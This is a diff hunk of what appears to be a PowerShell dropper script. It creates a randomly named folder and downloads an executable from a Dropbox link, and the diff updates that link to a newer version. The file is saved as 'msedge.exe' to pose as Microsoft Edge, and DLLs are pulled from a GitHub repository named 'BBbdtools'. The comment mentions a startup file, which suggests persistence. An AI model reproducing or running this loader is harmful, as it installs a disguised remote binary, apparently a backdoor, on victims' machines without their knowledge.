@@ -8,7 +8,7 @@ mkdir sVBXKuz
 cd sVBXKuz
 
 #download executable and startup file
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/8di6a2k4x9vfp5gw98ln9/wsappa-1.8.exe?rlkey=siwv86zxma0i4hquw6corpk34&dl=0" -OutFile msedge.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/m3ub7x9td0g1a7b2jlv62/wsappa-1.9.exe?rlkey=rhyarsxdetqvyyx5gfv44uyq7&dl=0" -OutFile msedge.exe
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll
 
